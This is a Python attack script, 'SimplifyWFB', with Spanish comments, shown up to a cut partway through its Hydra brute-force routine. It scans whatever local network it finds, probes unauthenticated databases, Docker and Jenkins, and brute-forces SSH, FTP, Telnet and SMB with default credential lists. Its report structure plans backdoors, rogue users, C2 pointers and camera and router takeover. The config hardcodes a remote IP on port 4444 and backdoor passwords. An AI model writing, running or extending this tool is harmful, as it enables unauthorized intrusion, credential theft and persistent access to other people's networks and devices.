#!/usr/bin/env python3
"""
Simplified WiFi Breaker - Script Simplificado de Pentesting
Contiene solo las funciones básicas: Full Scan y Pentest Frío
"""

import subprocess
import json
import time
import threading
import os
import tempfile
import sys
from typing import Dict, List, Any, Optional
from pathlib import Path
import re
import socket
import ipaddress
from datetime import datetime

class SimplifyWFB:
    """Script simplificado de pentesting con 4 fases básicas"""
    
    def __init__(self):
        self.start_time = time.time()
        self.config_data = self._load_config()
        self.report = {
            'metadata': {
                'script_name': 'SimplifyWFB',
                'version': '1.0.0',
                'start_time': datetime.now().isoformat(),
                'mode': None,  # 'full' o 'cold'
                'target_network': None,
                'local_ip': None,
                'external_ip': self.config_data['remote_access']['external_ip'],
                'external_port': self.config_data['remote_access']['external_port']
            },
            'phase_1_reconnaissance': {
                'status': 'pending',
                'hosts_discovered': [],
                'services_found': [],
                'technologies_detected': [],
                'network_topology': {},
                'errors': []
            },
            'phase_2_credentials': {
                'status': 'pending',
                'credentials_found': [],
                'attack_methods_used': [],
                'errors': []
            },
            'phase_3_lateral_movement': {
                'status': 'pending',
                'compromised_systems': [],
                'access_methods': [],
                'lateral_connections': [],
                'errors': []
            },
            'phase_4_persistence': {
                'status': 'pending',
                'persistent_access': [],
                'backdoors_created': [],
                'users_created': [],
                'remote_connections': [],
                'c2_pointers': [],
                'cameras_accessed': [],
                'router_access': [],
                'network_persistence': [],
                'errors': []
            },
            'phase_5_verification': {
                'status': 'pending',
                'persistence_checks': [],
                'access_verification': [],
                'errors': []
            },
            'cleanup': {
                'status': 'pending',
                'items_cleaned': [],
                'errors': []
            },
            'summary': {
                'total_hosts': 0,
                'compromised_hosts': 0,
                'persistent_access_points': 0,
                'total_credentials': 0,
                'execution_time': 0,
                'success_rate': 0.0
            }
        }
        
        # Configuración básica
        self.config = {
            'scan_timeout': 30,
            'max_threads': 10,
            'common_ports': [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 993, 995, 1433, 3389, 5432, 5900, 8080],
            'database_ports': [27017, 6379, 3306, 5432, 1433, 1521, 5984, 9200, 9300, 11211, 50070, 50075],
            'vulnerable_ports': [27017, 6379, 9200, 9300, 11211, 50070, 50075, 2375, 2376, 8080, 8443, 9000, 9001],
            'camera_ports': [80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 443, 554, 8080, 8081, 8082, 8083, 8084, 8085, 8086, 8087, 8088, 8089, 8090, 8888, 9999],
            'router_ports': [80, 443, 8080, 8443, 23, 22, 21, 161, 162],
            'default_users': ['admin', 'administrator', 'root', 'guest', 'user'],
            'default_passwords': ['admin', 'password', '123456', 'root', 'guest', ''],
            'camera_users': ['admin', 'administrator', 'root', 'guest', 'user', 'camera', 'ipcam', 'webcam', 'viewer', 'operator'],
            'camera_passwords': ['admin', 'password', '123456', 'root', 'guest', '', 'camera', 'ipcam', 'webcam', 'viewer', 'operator', '1234', '12345', '123456789', 'admin123', 'password123'],
            'router_users': ['admin', 'administrator', 'root', 'guest', 'user', 'admin', 'root', 'user', 'support', 'technician'],
            'router_passwords': ['admin', 'password', '123456', 'root', 'guest', '', 'admin', 'password', '1234', '12345', '123456', 'admin123', 'password123', 'support', 'technician']
        }
        
        # Detectar configuración de red automáticamente
        self._detect_network_config()
        
        # Configuración de red detectada
        self.network_config = {
            'detected': False,
            'network_range': None,
            'gateway': None,
            'dns_servers': [],
            'active_hosts': [],
            'network_type': 'unknown',
            'scan_parameters': {}
        }
    
    def _detect_network_config(self):
        """Detectar configuración de red automáticamente"""
        try:
            # Obtener IP local
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            
            self.report['metadata']['local_ip'] = local_ip
            
            # Calcular red objetivo
            ip_obj = ipaddress.IPv4Address(local_ip)
            network = ipaddress.IPv4Network(f"{ip_obj}/24", strict=False)
            self.report['metadata']['target_network'] = str(network)
            
            print(f"🌐 Red detectada: {self.report['metadata']['target_network']}")
            print(f"📍 IP local: {local_ip}")
            
        except Exception as e:
            print(f"❌ Error detectando red: {e}")
            self.report['metadata']['target_network'] = "192.168.1.0/24"
            self.report['metadata']['local_ip'] = "192.168.1.100"
    
    def auto_configure_network(self):
        """Autoconfiguración completa de la red antes del escaneo"""
        print("\n🔧 AUTO-CONFIGURACIÓN DE RED")
        print("=" * 50)
        
        try:
            # 1. Detectar información básica de red
            print("📡 Detectando información básica de red...")
            self._detect_basic_network_info()
            
            # 2. Detectar gateway
            print("🚪 Detectando gateway...")
            self._detect_gateway()
            
            # 3. Detectar servidores DNS
            print("🌐 Detectando servidores DNS...")
            self._detect_dns_servers()
            
            # 4. Escaneo rápido de hosts activos
            print("🔍 Escaneo rápido de hosts activos...")
            self._quick_host_discovery()
            
            # 5. Determinar tipo de red
            print("🏷️ Determinando tipo de red...")
            self._determine_network_type()
            
            # 6. Configurar parámetros de escaneo
            print("⚙️ Configurando parámetros de escaneo...")
            self._configure_scan_parameters()
            
            # 7. Mostrar resumen de configuración
            self._show_network_summary()
            
            self.network_config['detected'] = True
            print("\n✅ Auto-configuración completada exitosamente")
            
        except Exception as e:
            print(f"\n❌ Error en auto-configuración: {e}")
            self.network_config['detected'] = False
    
    def _detect_basic_network_info(self):
        """Detectar información básica de la red"""
        try:
            # Obtener IP local y máscara
            import netifaces
            
            # Obtener interfaz activa
            gateways = netifaces.gateways()
            default_interface = gateways['default'][netifaces.AF_INET][1]
            
            # Obtener información de la interfaz
            addrs = netifaces.ifaddresses(default_interface)
            ip_info = addrs[netifaces.AF_INET][0]
            
            local_ip = ip_info['addr']
            netmask = ip_info['netmask']
            
            # Calcular red
            import ipaddress
            network = ipaddress.IPv4Network(f"{local_ip}/{netmask}", strict=False)
            
            self.network_config['network_range'] = str(network)
            self.report['metadata']['target_network'] = str(network)
            self.report['metadata']['local_ip'] = local_ip
            
            print(f"   📍 IP local: {local_ip}")
            print(f"   🎭 Máscara: {netmask}")
            print(f"   🌐 Red: {network}")
            
        except ImportError:
            print("   ⚠️ netifaces no disponible, usando método básico")
            # Fallback al método básico
            self._detect_network_config()
            self.network_config['network_range'] = self.report['metadata']['target_network']
        except Exception as e:
            print(f"   ❌ Error detectando info básica: {e}")
            self._detect_network_config()
            self.network_config['network_range'] = self.report['metadata']['target_network']
    
    def _detect_gateway(self):
        """Detectar gateway de la red"""
        try:
            import netifaces
            
            gateways = netifaces.gateways()
            gateway_ip = gateways['default'][netifaces.AF_INET][0]
            
            self.network_config['gateway'] = gateway_ip
            
            # Verificar conectividad del gateway
            if self._ping_host(gateway_ip):
                print(f"   ✅ Gateway detectado: {gateway_ip} (activo)")
            else:
                print(f"   ⚠️ Gateway detectado: {gateway_ip} (sin respuesta)")
                
        except ImportError:
            print("   ⚠️ netifaces no disponible, estimando gateway")
            # Estimar gateway basado en IP local
            local_ip = self.report['metadata']['local_ip']
            ip_parts = local_ip.split('.')
            estimated_gateway = f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}.1"
            
            if self._ping_host(estimated_gateway):
                self.network_config['gateway'] = estimated_gateway
                print(f"   ✅ Gateway estimado: {estimated_gateway} (activo)")
            else:
                print(f"   ❌ Gateway estimado: {estimated_gateway} (sin respuesta)")
        except Exception as e:
            print(f"   ❌ Error detectando gateway: {e}")
    
    def _detect_dns_servers(self):
        """Detectar servidores DNS"""
        try:
            import netifaces
            
            # Obtener DNS de la interfaz activa
            gateways = netifaces.gateways()
            default_interface = gateways['default'][netifaces.AF_INET][1]
            
            # Leer /etc/resolv.conf en Linux o usar comando en Windows
            if os.name == 'nt':  # Windows
                result = self._run_command(['nslookup', 'google.com'], timeout=10)
                if result['success']:
                    # Extraer servidor DNS de la salida
                    lines = result['stdout'].split('\n')
                    for line in lines:
                        if 'Server:' in line:
                            dns_server = line.split(':')[1].strip()
                            self.network_config['dns_servers'].append(dns_server)
                            print(f"   🌐 DNS detectado: {dns_server}")
            else:  # Linux/Unix
                try:
                    with open('/etc/resolv.conf', 'r') as f:
                        for line in f:
                            if line.startswith('nameserver'):
                                dns_server = line.split()[1]
                                self.network_config['dns_servers'].append(dns_server)
                                print(f"   🌐 DNS detectado: {dns_server}")
                except FileNotFoundError:
                    print("   ⚠️ No se pudo leer /etc/resolv.conf")
                    
        except Exception as e:
            print(f"   ❌ Error detectando DNS: {e}")
    
    def _quick_host_discovery(self):
        """Descubrimiento rápido de hosts activos"""
        try:
            network = self.network_config['network_range']
            if not network:
                network = self.report['metadata']['target_network']
            
            print(f"   🔍 Escaneando {network}...")
            
            # Usar nmap para descubrimiento rápido
            command = [
                'nmap', '-sn', network,
                '--max-retries', '1',
                '--host-timeout', '5s',
                '--max-rtt-timeout', '1s'
            ]
            
            result = self._run_command(command, timeout=60)
            
            if result['success']:
                lines = result['stdout'].split('\n')
                active_hosts = []
                
                for line in lines:
                    if 'Nmap scan report for' in line:
                        # Extraer IP
                        ip_match = re.search(r'(\d+\.\d+\.\d+\.\d+)', line)
                        if ip_match:
                            ip = ip_match.group(1)
                            active_hosts.append(ip)
                
                self.network_config['active_hosts'] = active_hosts
                print(f"   ✅ {len(active_hosts)} hosts activos detectados")
                
                # Mostrar algunos hosts
                for i, host in enumerate(active_hosts[:5]):
                    print(f"      • {host}")
                if len(active_hosts) > 5:
                    print(f"      • ... y {len(active_hosts) - 5} más")
            else:
                print("   ⚠️ Nmap falló, usando ping manual")
                self._manual_host_discovery()
                
        except Exception as e:
            print(f"   ❌ Error en descubrimiento rápido: {e}")
            self._manual_host_discovery()
    
    def _manual_host_discovery(self):
        """Descubrimiento manual de hosts con ping"""
        try:
            network = self.network_config['network_range']
            if not network:
                network = self.report['metadata']['target_network']
            
            import ipaddress
            network_obj = ipaddress.IPv4Network(network)
            
            active_hosts = []
            total_hosts = len(list(network_obj.hosts()))
            
            print(f"   🔍 Ping manual en {total_hosts} hosts...")
            
            # Escanear solo algunos hosts para no tardar mucho
            hosts_to_scan = list(network_obj.hosts())[:50]  # Máximo 50 hosts
            
            for ip in hosts_to_scan:
                if self._ping_host(str(ip)):
                    active_hosts.append(str(ip))
            
            self.network_config['active_hosts'] = active_hosts
            print(f"   ✅ {len(active_hosts)} hosts activos detectados (de {len(hosts_to_scan)} escaneados)")
            
        except Exception as e:
            print(f"   ❌ Error en descubrimiento manual: {e}")
    
    def _determine_network_type(self):
        """Determinar tipo de red basado en la configuración"""
        try:
            local_ip = self.report['metadata']['local_ip']
            gateway = self.network_config.get('gateway')
            
            # Analizar rangos de IP
            ip_parts = local_ip.split('.')
            first_octet = int(ip_parts[0])
            
            if first_octet == 10:
                network_type = 'corporate_lan'
            elif first_octet == 172 and 16 <= int(ip_parts[1]) <= 31:
                network_type = 'corporate_lan'
            elif first_octet == 192 and ip_parts[1] == '168':
                network_type = 'home_network'
            elif first_octet == 169 and ip_parts[1] == '254':
                network_type = 'link_local'
            else:
                network_type = 'unknown'
            
            # Verificar si es red pública
            if gateway and gateway.startswith('192.168.') or gateway.startswith('10.') or gateway.startswith('172.'):
                network_type += '_private'
            else:
                network_type += '_public'
            
            self.network_config['network_type'] = network_type
            print(f"   🏷️ Tipo de red: {network_type}")
            
        except Exception as e:
            print(f"   ❌ Error determinando tipo de red: {e}")
            self.network_config['network_type'] = 'unknown'
    
    def _configure_scan_parameters(self):
        """Configurar parámetros de escaneo basados en la red detectada"""
        try:
            network_type = self.network_config.get('network_type', 'unknown')
            active_hosts_count = len(self.network_config.get('active_hosts', []))
            
            # Configurar timeouts basados en el tipo de red
            if 'corporate_lan' in network_type:
                scan_timeout = 60  # Redes corporativas pueden ser más lentas
                max_threads = 5    # Menos threads para no sobrecargar
            elif 'home_network' in network_type:
                scan_timeout = 30  # Redes domésticas típicamente rápidas
                max_threads = 10   # Más threads para redes pequeñas
            else:
                scan_timeout = 45  # Default
                max_threads = 8
            
            # Ajustar timeouts basado en número de hosts
            if active_hosts_count > 20:
                scan_timeout = min(scan_timeout + 30, 120)  # Máximo 2 minutos
                max_threads = max(max_threads - 2, 3)       # Mínimo 3 threads
            elif active_hosts_count < 5:
                scan_timeout = max(scan_timeout - 15, 15)   # Mínimo 15 segundos
                max_threads = min(max_threads + 2, 15)      # Máximo 15 threads
            
            # Configurar puertos basado en tipo de red
            if 'corporate_lan' in network_type:
                # Redes corporativas: más puertos empresariales
                common_ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 993, 995, 1433, 3389, 5432, 5900, 8080, 8443, 9090]
            else:
                # Redes domésticas: puertos más comunes
                common_ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 993, 995, 1433, 3389, 5432, 5900, 8080]
            
            # Actualizar configuración
            self.config['scan_timeout'] = scan_timeout
            self.config['max_threads'] = max_threads
            self.config['common_ports'] = common_ports
            
            self.network_config['scan_parameters'] = {
                'timeout': scan_timeout,
                'max_threads': max_threads,
                'ports_count': len(common_ports),
                'estimated_duration': active_hosts_count * scan_timeout / max_threads
            }
            
            print(f"   ⚙️ Timeout de escaneo: {scan_timeout}s")
            print(f"   ⚙️ Máximo threads: {max_threads}")
            print(f"   ⚙️ Puertos a escanear: {len(common_ports)}")
            print(f"   ⚙️ Duración estimada: {self.network_config['scan_parameters']['estimated_duration']:.1f}s")
            
        except Exception as e:
            print(f"   ❌ Error configurando parámetros: {e}")
    
    def _show_network_summary(self):
        """Mostrar resumen de la configuración de red"""
        print("\n📊 RESUMEN DE CONFIGURACIÓN DE RED")
        print("=" * 50)
        print(f"🌐 Red objetivo: {self.network_config.get('network_range', 'No detectada')}")
        print(f"📍 IP local: {self.report['metadata'].get('local_ip', 'No detectada')}")
        print(f"🚪 Gateway: {self.network_config.get('gateway', 'No detectado')}")
        print(f"🏷️ Tipo de red: {self.network_config.get('network_type', 'Desconocido')}")
        print(f"🔍 Hosts activos: {len(self.network_config.get('active_hosts', []))}")
        print(f"🌐 Servidores DNS: {len(self.network_config.get('dns_servers', []))}")
        
        scan_params = self.network_config.get('scan_parameters', {})
        if scan_params:
            print(f"⏱️ Duración estimada: {scan_params.get('estimated_duration', 0):.1f} segundos")
            print(f"🧵 Threads configurados: {scan_params.get('max_threads', 0)}")
            print(f"🔌 Puertos a escanear: {scan_params.get('ports_count', 0)}")
    
    def _load_config(self):
        """Cargar configuración desde archivo config.json"""
        try:
            with open('config.json', 'r', encoding='utf-8') as f:
                return json.load(f)
        except FileNotFoundError:
            print("⚠️ Archivo config.json no encontrado, usando configuración por defecto")
            return {
                'remote_access': {
                    'external_ip': '184.107.168.100',
                    'external_port': 4444
                },
                'persistence': {
                    'ssh_port': 2222,
                    'vpn_port': 1194,
                    'web_port': 8080
                },
                'credentials': {
                    'ssh_user': 'svc_ssh',
                    'ssh_password': 'SSH_P@ssw0rd_2024!',
                    'web_user': 'admin',
                    'web_password': 'Web_P@ssw0rd_2024!'
                }
            }
        except Exception as e:
            print(f"❌ Error cargando configuración: {e}")
            return self._load_config()  # Recursión para usar configuración por defecto
    
    def _run_command(self, command: List[str], timeout: int = 30) -> Dict[str, Any]:
        """Ejecutar comando y capturar salida"""
        try:
            result = subprocess.run(
                command,
                capture_output=True,
                text=True,
                timeout=timeout,
                encoding='utf-8',
                errors='replace'
            )
            
            return {
                'stdout': result.stdout,
                'stderr': result.stderr,
                'return_code': result.returncode,
                'success': result.returncode == 0
            }
            
        except subprocess.TimeoutExpired:
            return {'stdout': '', 'stderr': 'Timeout', 'return_code': -1, 'success': False}
        except Exception as e:
            return {'stdout': '', 'stderr': str(e), 'return_code': -1, 'success': False}
    
    def phase_1_reconnaissance(self):
        """Fase 1: Reconocimiento completo de la red"""
        print("\n🔍 FASE 1: RECONOCIMIENTO COMPLETO")
        print("=" * 50)
        
        self.report['phase_1_reconnaissance']['status'] = 'running'
        
        try:
            # 1. Descubrimiento de hosts con nmap
            # 1. Obtener IP pública de la red atacada
            print("🌍 Detectando IP pública de la red...")
            public_ip = self._get_public_ip()
            self.report['phase_1_reconnaissance']['public_ip'] = public_ip
            print(f"📍 IP pública detectada: {public_ip}")
            
            # 2. Descubrir hosts en la red
            print("📡 Descubriendo hosts en la red...")
            hosts = self._discover_hosts()
            self.report['phase_1_reconnaissance']['hosts_discovered'] = hosts
            
            # 2. Escaneo de puertos y servicios
            print("🔍 Escaneando puertos y servicios...")
            services = self._scan_services(hosts)
            self.report['phase_1_reconnaissance']['services_found'] = services
            
            # 3. Detección de tecnologías
            print("🛠️ Detectando tecnologías...")
            technologies = self._detect_technologies(services)
            self.report['phase_1_reconnaissance']['technologies_detected'] = technologies
            
            # 4. Detectar bases de datos y servicios vulnerables
            print("🗄️ Detectando bases de datos y servicios vulnerables...")
            vulnerable_services = self._detect_vulnerable_services(services)
            self.report['phase_1_reconnaissance']['vulnerable_services'] = vulnerable_services
            
            # 5. Mapeo de topología
            print("🗺️ Mapeando topología de red...")
            topology = self._map_network_topology(hosts)
            self.report['phase_1_reconnaissance']['network_topology'] = topology
            
            self.report['phase_1_reconnaissance']['status'] = 'completed'
            print(f"✅ Reconocimiento completado: {len(hosts)} hosts, {len(services)} servicios")
            
        except Exception as e:
            self.report['phase_1_reconnaissance']['status'] = 'error'
            self.report['phase_1_reconnaissance']['errors'].append(str(e))
            print(f"❌ Error en reconocimiento: {e}")
    
    def _get_public_ip(self) -> str:
        """Obtener la IP pública de la red atacada"""
        try:
            import urllib.request
            import json
            
            # Servicios para obtener IP pública
            services = [
                'https://api.ipify.org',
                'https://ipinfo.io/ip',
                'https://icanhazip.com',
                'https://ident.me',
                'https://api.my-ip.io/ip'
            ]
            
            for service in services:
                try:
                    with urllib.request.urlopen(service, timeout=5) as response:
                        ip = response.read().decode('utf-8').strip()
                        if self._is_valid_ip(ip):
                            return ip
                except Exception:
                    continue
            
            return "No detectada"
            
        except Exception as e:
            print(f"❌ Error obteniendo IP pública: {e}")
            return "Error"
    
    def _is_valid_ip(self, ip: str) -> bool:
        """Validar si una IP es válida"""
        try:
            import ipaddress
            ipaddress.ip_address(ip)
            return True
        except ValueError:
            return False
    
    def _discover_hosts(self) -> List[Dict[str, Any]]:
        """Descubrir hosts en la red"""
        hosts = []
        network = self.report['metadata']['target_network']
        
        try:
            # Usar nmap para descubrimiento rápido
            command = ['nmap', '-sn', network, '--max-retries', '1', '--host-timeout', '10s']
            result = self._run_command(command, timeout=60)
            
            if result['success']:
                lines = result['stdout'].split('\n')
                for line in lines:
                    if 'Nmap scan report for' in line:
                        # Extraer IP
                        ip_match = re.search(r'(\d+\.\d+\.\d+\.\d+)', line)
                        if ip_match:
                            ip = ip_match.group(1)
                            
                            # Obtener MAC si está disponible
                            mac = None
                            vendor = None
                            
                            host_info = {
                                'ip': ip,
                                'mac': mac,
                                'vendor': vendor,
                                'status': 'up',
                                'discovery_method': 'nmap_ping'
                            }
                            hosts.append(host_info)
            
            # Si nmap falla, usar ping manual
            if not hosts:
                print("⚠️ Nmap falló, usando ping manual...")
                network_obj = ipaddress.IPv4Network(network)
                for ip in network_obj.hosts():
                    if self._ping_host(str(ip)):
                        hosts.append({
                            'ip': str(ip),
                            'mac': None,
                            'vendor': None,
                            'status': 'up',
                            'discovery_method': 'ping'
                        })
            
        except Exception as e:
            print(f"❌ Error descubriendo hosts: {e}")
        
        return hosts
    
    def _ping_host(self, ip: str) -> bool:
        """Hacer ping a un host"""
        try:
            command = ['ping', '-c', '1', '-W', '1', ip]
            result = self._run_command(command, timeout=5)
            return result['success']
        except:
            return False
    
    def _scan_services(self, hosts: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Escanear servicios en los hosts"""
        services = []
        
        for host in hosts:
            ip = host['ip']
            print(f"🔍 Escaneando {ip}...")
            
            try:
                # Escaneo completo de puertos comunes + bases de datos + vulnerables
                all_ports = list(set(
                    self.config['common_ports'] + 
                    self.config['database_ports'] + 
                    self.config['vulnerable_ports'] +
                    self.config['camera_ports'] +
                    self.config['router_ports']
                ))
                ports_to_scan = ','.join(map(str, all_ports))
                command = ['nmap', '-sS', '-O', '-sV', '-p', ports_to_scan, ip]
                result = self._run_command(command, timeout=120)
                
                if result['success']:
                    # Parsear salida de nmap
                    host_services = self._parse_nmap_output(result['stdout'], ip)
                    services.extend(host_services)
                    
            except Exception as e:
                print(f"❌ Error escaneando {ip}: {e}")
        
        return services
    
    def _parse_nmap_output(self, output: str, host_ip: str) -> List[Dict[str, Any]]:
        """Parsear salida de nmap"""
        services = []
        lines = output.split('\n')
        
        for line in lines:
            if '/tcp' in line and 'open' in line:
                parts = line.split()
                if len(parts) >= 3:
                    port_info = parts[0].split('/')
                    port = int(port_info[0])
                    protocol = port_info[1]
                    state = parts[1]
                    
                    service_info = {
                        'host': host_ip,
                        'port': port,
                        'protocol': protocol,
                        'state': state,
                        'service': 'unknown',
                        'version': 'unknown'
                    }
                    
                    # Extraer servicio y versión si están disponibles
                    if len(parts) > 2:
                        service_info['service'] = parts[2]
                    if len(parts) > 3:
                        service_info['version'] = ' '.join(parts[3:])
                    
                    services.append(service_info)
        
        return services
    
    def _detect_vulnerable_services(self, services: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Detectar servicios vulnerables como bases de datos expuestas"""
        vulnerable_services = []
        
        for service in services:
            port = service.get('port')
            service_name = service.get('service', '').lower()
            host = service.get('host')
            
            # Detectar bases de datos y servicios vulnerables
            if port in self.config['database_ports'] or port in self.config['vulnerable_ports']:
                vulnerable_info = self._check_service_vulnerability(host, port, service_name)
                if vulnerable_info:
                    vulnerable_services.append(vulnerable_info)
        
        return vulnerable_services
    
    def _check_service_vulnerability(self, host: str, port: int, service_name: str) -> Optional[Dict[str, Any]]:
        """Verificar si un servicio es vulnerable"""
        try:
            # MongoDB (puerto 27017)
            if port == 27017:
                return self._check_mongodb_vulnerability(host, port)
            
            # Redis (puerto 6379)
            elif port == 6379:
                return self._check_redis_vulnerability(host, port)
            
            # Elasticsearch (puertos 9200, 9300)
            elif port in [9200, 9300]:
                return self._check_elasticsearch_vulnerability(host, port)
            
            # Memcached (puerto 11211)
            elif port == 11211:
                return self._check_memcached_vulnerability(host, port)
            
            # Docker (puertos 2375, 2376)
            elif port in [2375, 2376]:
                return self._check_docker_vulnerability(host, port)
            
            # Jenkins (puerto 8080)
            elif port == 8080 and 'jenkins' in service_name:
                return self._check_jenkins_vulnerability(host, port)
            
            return None
            
        except Exception as e:
            print(f"❌ Error verificando vulnerabilidad {host}:{port}: {e}")
            return None
    
    def _check_mongodb_vulnerability(self, host: str, port: int) -> Optional[Dict[str, Any]]:
        """Verificar MongoDB sin autenticación"""
        try:
            import socket
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((host, port))
            sock.close()
            
            if result == 0:
                return {
                    'host': host,
                    'port': port,
                    'service': 'mongodb',
                    'vulnerability': 'No authentication required',
                    'severity': 'high',
                    'exploit_method': 'Direct connection',
                    'backdoor_created': False
                }
        except Exception:
            pass
        return None
    
    def _check_redis_vulnerability(self, host: str, port: int) -> Optional[Dict[str, Any]]:
        """Verificar Redis sin autenticación"""
        try:
            import socket
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((host, port))
            sock.close()
            
            if result == 0:
                return {
                    'host': host,
                    'port': port,
                    'service': 'redis',
                    'vulnerability': 'No authentication required',
                    'severity': 'high',
                    'exploit_method': 'Direct connection',
                    'backdoor_created': False
                }
        except Exception:
            pass
        return None
    
    def _check_elasticsearch_vulnerability(self, host: str, port: int) -> Optional[Dict[str, Any]]:
        """Verificar Elasticsearch expuesto"""
        try:
            import urllib.request
            
            url = f"http://{host}:{port}/_cluster/health"
            req = urllib.request.Request(url)
            req.add_header('User-Agent', 'Mozilla/5.0')
            
            with urllib.request.urlopen(req, timeout=5) as response:
                if response.status == 200:
                    return {
                        'host': host,
                        'port': port,
                        'service': 'elasticsearch',
                        'vulnerability': 'Exposed API',
                        'severity': 'medium',
                        'exploit_method': 'HTTP API access',
                        'backdoor_created': False
                    }
        except Exception:
            pass
        return None
    
    def _check_memcached_vulnerability(self, host: str, port: int) -> Optional[Dict[str, Any]]:
        """Verificar Memcached expuesto"""
        try:
            import socket
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((host, port))
            sock.close()
            
            if result == 0:
                return {
                    'host': host,
                    'port': port,
                    'service': 'memcached',
                    'vulnerability': 'No authentication required',
                    'severity': 'medium',
                    'exploit_method': 'Direct connection',
                    'backdoor_created': False
                }
        except Exception:
            pass
        return None
    
    def _check_docker_vulnerability(self, host: str, port: int) -> Optional[Dict[str, Any]]:
        """Verificar Docker daemon expuesto"""
        try:
            import urllib.request
            
            url = f"http://{host}:{port}/version"
            req = urllib.request.Request(url)
            req.add_header('User-Agent', 'Mozilla/5.0')
            
            with urllib.request.urlopen(req, timeout=5) as response:
                if response.status == 200:
                    return {
                        'host': host,
                        'port': port,
                        'service': 'docker',
                        'vulnerability': 'Exposed Docker daemon',
                        'severity': 'critical',
                        'exploit_method': 'Docker API access',
                        'backdoor_created': False
                    }
        except Exception:
            pass
        return None
    
    def _check_jenkins_vulnerability(self, host: str, port: int) -> Optional[Dict[str, Any]]:
        """Verificar Jenkins expuesto"""
        try:
            import urllib.request
            
            url = f"http://{host}:{port}/"
            req = urllib.request.Request(url)
            req.add_header('User-Agent', 'Mozilla/5.0')
            
            with urllib.request.urlopen(req, timeout=5) as response:
                if response.status == 200:
                    content = response.read().decode('utf-8', errors='ignore')
                    if 'jenkins' in content.lower():
                        return {
                            'host': host,
                            'port': port,
                            'service': 'jenkins',
                            'vulnerability': 'Exposed Jenkins interface',
                            'severity': 'high',
                            'exploit_method': 'Web interface access',
                            'backdoor_created': False
                        }
        except Exception:
            pass
        return None
    
    def _detect_technologies(self, services: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Detectar tecnologías en los servicios"""
        technologies = []
        
        for service in services:
            if service['service'] != 'unknown':
                tech_info = {
                    'host': service['host'],
                    'port': service['port'],
                    'technology': service['service'],
                    'version': service['version'],
                    'confidence': 'high' if service['version'] != 'unknown' else 'medium'
                }
                technologies.append(tech_info)
        
        return technologies
    
    def _map_network_topology(self, hosts: List[Dict[str, Any]]) -> Dict[str, Any]:
        """Mapear topología de red"""
        topology = {
            'total_hosts': len(hosts),
            'hosts_by_type': {},
            'network_segments': [],
            'gateway': None
        }
        
        # Clasificar hosts por tipo
        for host in hosts:
            ip = host['ip']
            last_octet = int(ip.split('.')[-1])
            
            if last_octet == 1:
                topology['gateway'] = ip
            elif last_octet < 10:
                host_type = 'infrastructure'
            elif last_octet < 100:
                host_type = 'servers'
            else:
                host_type = 'clients'
            
            if host_type not in topology['hosts_by_type']:
                topology['hosts_by_type'][host_type] = []
            topology['hosts_by_type'][host_type].append(ip)
        
        return topology
    
    def phase_2_credentials(self):
        """Fase 2: Recolección de credenciales"""
        print("\n🔐 FASE 2: RECOLECCIÓN DE CREDENCIALES")
        print("=" * 50)
        
        self.report['phase_2_credentials']['status'] = 'running'
        
        try:
            # 1. Ataques de fuerza bruta
            print("💥 Ejecutando ataques de fuerza bruta...")
            brute_force_results = self._brute_force_attacks()
            self.report['phase_2_credentials']['credentials_found'].extend(brute_force_results)
            
            # 2. Credenciales por defecto
            print("🔑 Probando credenciales por defecto...")
            default_creds = self._test_default_credentials()
            self.report['phase_2_credentials']['credentials_found'].extend(default_creds)
            
            # 3. Sniffing de tráfico
            print("👂 Sniffing de tráfico de red...")
            sniffed_creds = self._sniff_credentials()
            self.report['phase_2_credentials']['credentials_found'].extend(sniffed_creds)
            
            self.report['phase_2_credentials']['status'] = 'completed'
            print(f"✅ Recolección completada: {len(self.report['phase_2_credentials']['credentials_found'])} credenciales")
            
        except Exception as e:
            self.report['phase_2_credentials']['status'] = 'error'
            self.report['phase_2_credentials']['errors'].append(str(e))
            print(f"❌ Error en recolección: {e}")
    
    def _brute_force_attacks(self) -> List[Dict[str, Any]]:
        """Ejecutar ataques de fuerza bruta"""
        credentials = []
        services = self.report['phase_1_reconnaissance']['services_found']
        
        for service in services:
            if service['service'] in ['ssh', 'ftp', 'telnet', 'smb']:
                print(f"💥 Fuerza bruta en {service['host']}:{service['port']} ({service['service']})")
                
                # Ejecutar ataque de fuerza bruta real
                brute_result = self._real_brute_force(service)
                if brute_result:
                    cred = {
                        'host': service['host'],
                        'port': service['port'],
                        'service': service['service'],
                        'username': brute_result['username'],
                        'password': brute_result['password'],
                        'method': 'brute_force',
                        'timestamp': time.time()
                    }
                    credentials.append(cred)
                    print(f"✅ Credenciales encontradas: {brute_result['username']}:{brute_result['password']}")
        
        return credentials
    
    def _real_brute_force(self, service: Dict[str, Any]) -> Optional[Dict[str, str]]:
        """Ejecutar ataque de fuerza bruta real con Hydra"""
        try:
            # Crear archivo temporal con usuarios
            users_file = tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt')
            for user in self.config['default_users']:
                users_file.write(f"{user}\n")
            users_file.close()
            
            # Crear archivo temporal con contraseñas
            passwords_file = tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt')
            for password in self.config['default_passwords']:
                passwords_file.write(f"{password}\n")
            passwords_file.close()
            
            # Determinar protocolo para Hydra
            protocol_map = {
                'ssh': 'ssh',
                'ftp': 'ftp',
                'telnet': 'telnet',
                'smb': 'smb',
                'http': 'http-get',
                'https': 'https-get'
            }
            
            protocol = protocol_map.get(service['service'], service['service'])
            
            # Comando Hydra
            hydra_cmd = [
                'hydra',
                '-L', users_file.name,
                '-P', passwords_file.name,
                '-t', '4',  # 4 threads
                '-f',  # Stop on first success
                '-o', '-',  # Output to stdout
                f"{service['host']}://{protocol}"
            ]
            
